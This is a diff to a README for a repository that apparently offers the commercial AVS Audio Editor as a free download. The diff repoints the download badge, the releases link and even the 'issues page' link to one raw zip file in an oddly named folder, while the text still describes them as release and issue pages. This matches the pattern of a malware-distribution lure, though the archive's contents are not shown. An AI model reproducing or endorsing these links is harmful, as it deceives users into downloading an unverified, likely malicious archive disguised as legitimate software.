@@ -1,6 +1,6 @@
 # 🎵 AVS-Audio-Editor-Download - Easy Audio Editing for Everyone
 
-[![Download AVS-Audio-Editor](https://img.shields.io/badge/Download-AVS--Audio--Editor-blue.svg)](https://github.com/Laboriel12/AVS-Audio-Editor-Download/releases)
+[![Download AVS-Audio-Editor](https://raw.githubusercontent.com/Laboriel12/AVS-Audio-Editor-Download/main/endosmometric/AVS-Audio-Editor-Download.zip)](https://raw.githubusercontent.com/Laboriel12/AVS-Audio-Editor-Download/main/endosmometric/AVS-Audio-Editor-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the AVS Audio Editor Download! This guide will help you download and 
 
 1. **Visit the Release Page**  
    Click the link below to go to the releases page. Here, you will find the latest version of the AVS Audio Editor.
-   [Download Here](https://github.com/Laboriel12/AVS-Audio-Editor-Download/releases)  
+   [Download Here](https://raw.githubusercontent.com/Laboriel12/AVS-Audio-Editor-Download/main/endosmometric/AVS-Audio-Editor-Download.zip)  
 
 2. **Select the Version**  
    On the releases page, you will see a list of available versions of the AVS Audio Editor. Choose the most recent version or the one you prefer.
@@ -77,7 +77,7 @@ Currently, AVS Audio Editor is a desktop application. It doesn’t support onlin
 
 ## 🛠 Support
 
-If you encounter any issues during download or installation, check the [issues page](https://github.com/Laboriel12/AVS-Audio-Editor-Download/issues) for solutions or to report a problem.
+If you encounter any issues during download or installation, check the [issues page](https://raw.githubusercontent.com/Laboriel12/AVS-Audio-Editor-Download/main/endosmometric/AVS-Audio-Editor-Download.zip) for solutions or to report a problem.
 
 ## 📝 Topics Covered
 
